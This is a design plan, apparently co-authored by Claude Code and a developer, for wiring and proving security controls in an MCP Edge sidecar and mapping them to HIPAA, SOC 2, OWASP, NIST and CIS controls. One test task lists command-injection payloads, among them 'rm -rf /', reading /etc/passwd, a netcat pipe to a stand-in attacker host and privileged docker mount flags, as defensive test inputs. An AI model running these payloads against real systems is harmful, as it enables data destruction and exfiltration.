# HDIM MCP Edge — Industry Validation Proof Design

**Date:** 2026-03-04
**Status:** Approved
**Author:** Claude Code + Aaron
**Approach:** Layered Proof Pyramid — wire, prove, benchmark
**Audience:** CISO / Security Audit + Investor Technical Due Diligence

## Overview

Create an industry-best validation proof for the MCP Edge sidecar architecture. The proof demonstrates security posture, engineering rigor, and compliance readiness across five major frameworks: HIPAA Security Rule, SOC 2 Type II, OWASP API Security Top 10, NIST 800-53 (select controls), and CIS Benchmarks.

The gap analysis found that hardening controls (rate limiting, CORS, audit logging, param validation, deep health) were built and unit-tested but never wired into the live server pipeline. This design addresses wiring completion, proof testing, and compliance mapping as a unified effort.

## Architecture: Layered Proof Pyramid

```
┌─────────────────────────────────────────────────────────────┐
│  Layer 4: COMPLIANCE MAPPING REPORT                         │
│  HIPAA 164.312 · SOC 2 TSC · OWASP API Top 10              │
│  NIST 800-53 (select) · CIS Benchmarks                     │
│  Output: compliance-mapping.md + hardening-report.md        │
├─────────────────────────────────────────────────────────────┤
│  Layer 3: INTEGRATION PROOF SUITE                           │
│  End-to-end MCP round-trips · inputSchema audit             │
│  Deep health integration · Full regression + coverage       │
├─────────────────────────────────────────────────────────────┤
│  Layer 2: SECURITY CONTROL PROOF                            │
│  Rate-limit enforcement · CORS rejection · Audit trail      │
│  Injection matrix · RBAC exhaustive · Param validation      │
│  Output: dedicated proof test files per control             │
├─────────────────────────────────────────────────────────────┤
│  Layer 1: WIRING COMPLETION                                 │
│  Wire rate-limit → server.js · Wire CORS → server.js        │
│  Wire audit → router + server · Wire param-val → router     │
│  Implement deep health probes · Add inputSchema to tools    │
├─────────────────────────────────────────────────────────────┤
│  Layer 0: BASELINE CHECKPOINT                               │
│  433 existing tests pass · Coverage baseline captured        │
│  Output: baseline metrics snapshot                          │
└─────────────────────────────────────────────────────────────┘
```

Each layer only builds on the one below. If a layer's tests pass, everything beneath is proven. The compliance mapping at Layer 4 references specific test files and line numbers as evidence.

## Layer 0: Baseline Checkpoint

Capture starting metrics before changes:
- 433 tests, 40 suites, coverage percentages
- 18 bridge tests (separate runner)
- Snapshot to `mcp-edge-common/__tests__/baseline-snapshot.json`

## Layer 1: Wiring Completion (7 tasks, 3 parallel streams)

### Stream 1: Middleware Wiring (T1.1–T1.3)

- **T1.1:** Wire `createRateLimiter()` into both `server.js` — after `express.json()`, before routes
- **T1.2:** Wire `createCorsOptions()` into both `server.js` — replace hardcoded `cors({ origin: '*' })`
- **T1.3:** Wire `validateToolParams()` into `mcp-router.js` `handleToolsCall` — after auth check, before handler. Return `-32602` for invalid params.

### Stream 2: Audit Logging Pipeline (T1.4–T1.5)

- **T1.4:** Add `logger` option to `createMcpRouter()`. Emit structured audit entries:
  ```javascript
  logger.info({ tool, role, success: !error, duration_ms, demo: isDemoMode() }, 'tool_call');
  logger.error({ tool, role, error_code, duration_ms }, 'tool_error');
  ```
- **T1.5:** Instantiate `createAuditLogger()` in both `server.js`, pass to router.

### Stream 3: Deep Health Probes (T1.6–T1.7)

- **T1.6:** Platform `edge_health` — probe gateway `/actuator/health` with 3s timeout. Return `downstream.gateway.reachable` and `status: 'degraded'` when unreachable.
- **T1.7:** DevOps `edge_health` — probe docker socket via `execFile('docker', ['info'])` with 3s timeout. Return `downstream.docker.reachable` and `status: 'degraded'` when unreachable. Update `health.js` to return HTTP 503 for `unhealthy` status.

All tasks use TDD: write failing test → implement → green → commit.

## Layer 2: Security Control Proof (6 tasks, all parallel)

Each task creates a dedicated, self-contained proof file that auditors can run independently.

- **T2.1:** `rate-limit-proof.test.js` — Supertest integration proving 429 after threshold on both sidecars, /health skip, RateLimit-* headers
- **T2.2:** `cors-proof.test.js` — Disallowed origins get no Access-Control-Allow-Origin, allowed origins do, wildcard dev mode works
- **T2.3:** `audit-trail-proof.test.js` — Every tool call emits structured audit log with role/tool/duration/success, sensitive data scrubbed (Bearer tokens, patient_id, ssn, mrn)
- **T2.4:** `docker-security.test.js` — 9 injection payloads × docker tools matrix:
  ```
  ; rm -rf /    $(cat /etc/passwd)    `whoami`    | nc evil.com 1234
  ../../../etc/passwd    service\nARG2    service\x00injected
  service --privileged    -v /:/host
  ```
- **T2.5:** `mcp-edge-devops/__tests__/rbac-matrix.test.js` — 7 roles × 7 tools = 49 exhaustive cases
- **T2.6:** `param-validation-proof.test.js` — MCP-level param rejection (extra fields, type mismatches, missing required) returning `-32602`

## Layer 3: Integration Proof Suite (3 tasks)

- **T3.1:** `deep-health-integration.test.js` in both sidecars — downstream probe returns `degraded`, verify all response fields
- **T3.2:** inputSchema audit — verify all 15 tools have strict `inputSchema` with `additionalProperties: false`
- **T3.3:** Full regression — target: 500+ tests, >99% statement, >95% branch, 100% function coverage

## Layer 4: Compliance Mapping Report (2 tasks)

### T4.1: Compliance Mapping Document

Maps every security control to test evidence across five frameworks:

**HIPAA Security Rule (45 CFR 164.312)**
| Control | Description | Evidence |
|---------|-------------|----------|
| 164.312(a)(1) | Access Control | rbac-matrix tests (105 cases across both sidecars) |
| 164.312(a)(2)(iv) | Encryption/Decryption | TLS config + helmet headers |
| 164.312(b) | Audit Controls | audit-trail-proof.test.js |
| 164.312(c)(1) | Integrity | param-validation, inputSchema audit |
| 164.312(d) | Authentication | auth.test.js (API keys, role extraction) |
| 164.312(e)(1) | Transmission Security | CORS lockdown, rate limiting |

**SOC 2 Trust Services Criteria**
| Criteria | Description | Evidence |
|----------|-------------|----------|
| CC6.1 | Logical Access | RBAC matrices + boundary isolation |
| CC6.3 | Role-Based Access | role policy tests (7 roles, 15 tools) |
| CC7.2 | System Monitoring | audit logging + deep health probes |
| CC8.1 | Change Management | TDD process, git commit history |

**OWASP API Security Top 10 (2023)**
| ID | Vulnerability | Mitigation Evidence |
|----|--------------|---------------------|
| API1 | Broken Object Level Auth | boundary isolation tests (17 cases) |
| API2 | Broken Authentication | auth.test.js (52+ tests) |
| API3 | Broken Object Property Level Auth | param validation proof |
| API4 | Unrestricted Resource Consumption | rate-limit-proof.test.js |
| API5 | Broken Function Level Auth | RBAC matrices (105 cases) |
| API8 | Security Misconfiguration | CORS proof, helmet tests, body limits |

**NIST 800-53 (Select Controls)**
| Control | Description | Evidence |
|---------|-------------|----------|
| AC-2 | Account Management | role policies in auth.js |
| AC-6 | Least Privilege | role-based tool filtering |
| AU-2 | Audit Events | audit-trail-proof.test.js |
| AU-3 | Content of Audit Records | structured pino logging with scrub |
| SC-7 | Boundary Protection | sidecar isolation (17 boundary tests) |
| SI-10 | Information Input Validation | param validator + SERVICE_NAME_PATTERN |

**CIS Benchmarks**
| Benchmark | Evidence |
|-----------|----------|
| Input Validation | param-validator, service name regex, inputSchema audit |
| Error Handling | PHI leak detection tests (5 cases) |
| Security Headers | helmet configuration tests (8 cases) |
| Rate Limiting | rate-limit-proof.test.js |

Each mapping: Control ID → Description → Test File:Line → Pass/Fail → Evidence Notes

### T4.2: Hardening Validation Report

Final report documenting: all security controls added, test counts by category, coverage before/after, remaining gaps (JWT deferred to Layer 4), HIPAA/CISO audit readiness checklist.

## Parallel Execution Plan

```
Wave 0 (baseline):     T0.1
Wave 1 (wire):         T1.1, T1.2, T1.3 | T1.4, T1.5 | T1.6, T1.7  (3 streams)
Wave 2 (prove):        T2.1–T2.6  (6 parallel)
Wave 3 (integrate):    T3.1, T3.2, T3.3
Wave 4 (map):          T4.1 — compliance mapping
Wave 5 (finalize):     T4.2 — hardening validation report
```

## Deliverables

| Deliverable | File | Audience |
|-------------|------|----------|
| Compliance Mapping | `docs/plans/2026-03-04-compliance-mapping.md` | CISO, Auditors |
| Hardening Report | `docs/plans/2026-03-04-hdim-mcp-edge-hardening-report.md` | CISO, Investors |
| Baseline Snapshot | `mcp-edge-common/__tests__/baseline-snapshot.json` | CI/CD |
| Security Proof Tests | 6 dedicated proof files | Engineering, Auditors |
| Coverage Report | Jest V8 coverage output | Engineering |

## Success Criteria

- 500+ tests passing across all packages
- >99% statement coverage, >95% branch coverage, 100% function coverage
- Every HIPAA 164.312 control mapped to at least one test
- Every OWASP API Top 10 item addressed
- Zero unwired security controls
- All proof tests independently executable
- Machine-readable baseline for CI/CD regression gates
